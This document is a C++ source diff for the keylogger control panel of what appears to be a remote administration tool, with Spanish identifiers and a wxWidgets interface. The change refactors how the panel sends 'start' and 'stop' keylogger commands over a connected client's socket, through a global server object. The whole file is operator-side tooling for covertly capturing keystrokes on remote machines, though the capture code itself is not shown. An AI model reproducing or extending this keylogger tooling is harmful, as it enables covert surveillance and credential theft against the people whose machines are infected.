@@ -1,5 +1,8 @@
 #include "panel_keylogger.hpp"
 #include "frame_client.hpp"
+#include "server.hpp"
+
+extern Servidor* p_Servidor;
 
 wxBEGIN_EVENT_TABLE(panelKeylogger, wxPanel)
 	EVT_TOGGLEBUTTON(EnumIDS::ID_KL_BTN_Toggle, panelKeylogger::OnToggle)
@@ -9,6 +12,18 @@ wxEND_EVENT_TABLE()
 
 panelKeylogger::panelKeylogger(wxWindow* pParent) :
 	wxPanel(pParent, EnumIDS::ID_KL_Panel) {
+
+	wxWindow* wxTree = (MyTreeCtrl*)this->GetParent();
+	if (wxTree) {
+		wxPanel* panel_cliente = (wxPanel*)wxTree->GetParent();
+		if (panel_cliente) {
+			FrameCliente* frame_cliente = (FrameCliente*)panel_cliente->GetParent();
+			if (frame_cliente) {
+				this->sckCliente = frame_cliente->sckCliente;
+			}
+		}
+	}
+
 	this->btn_Iniciar = new wxToggleButton(this, EnumIDS::ID_KL_BTN_Toggle, "Iniciar");
 	
 	wxSize btn_size = this->btn_Iniciar->GetSize();
@@ -57,25 +72,6 @@ void panelKeylogger::OnLimpiar(wxCommandEvent& event) {
 	}
 }
 
-void panelKeylogger::EnviarComando(std::string strComando, bool isBlock) {
-	MyTreeCtrl* temp_tree = (MyTreeCtrl*)this->GetParent();
-	if (temp_tree) {
-		wxPanel* temp_panel = (wxPanel*)temp_tree->GetParent();
-		if (temp_panel) {
-			FrameCliente* temp_cliente = (FrameCliente*)temp_panel->GetParent();
-			if (temp_cliente) {
-				int iEnviado = temp_cliente->EnviarComando(strComando, isBlock);
-				std::cout << "[!] " << iEnviado << " bytes enviados" << std::endl;
-			}else {
-				std::cout << "[X] No se pudo encontrar el panel" << std::endl;
-			}
-		}else {
-			std::cout << "[X] No se pudo encontrar el frame del cliente" << std::endl;
-		}
-	}else {
-		std::cout << "[X] No se pudo encontrar el padre del panel keylogger" << std::endl;
-	}
-}
 
 void panelKeylogger::OnToggle(wxCommandEvent& event) {
 	bool isSel = this->btn_Iniciar->GetValue();
@@ -84,13 +80,13 @@ void panelKeylogger::OnToggle(wxCommandEvent& event) {
 		//Iniciar keylogger
 		strComando = std::to_string(EnumComandos::KL_Iniciar);
 		strComando.append(1, '~');
-		this->EnviarComando(strComando, false);
+		p_Servidor->cSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false);
 		this->btn_Iniciar->SetLabelText(wxT("Detener"));
 	}else {
 		//Apagar keylogger
 		strComando = std::to_string(EnumComandos::KL_Detener);
 		strComando.append(1, '~');
-		this->EnviarComando(strComando, false);
+		p_Servidor->cSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false);
 		this->btn_Iniciar->SetLabelText(wxT("Iniciar"));
 	}
 }
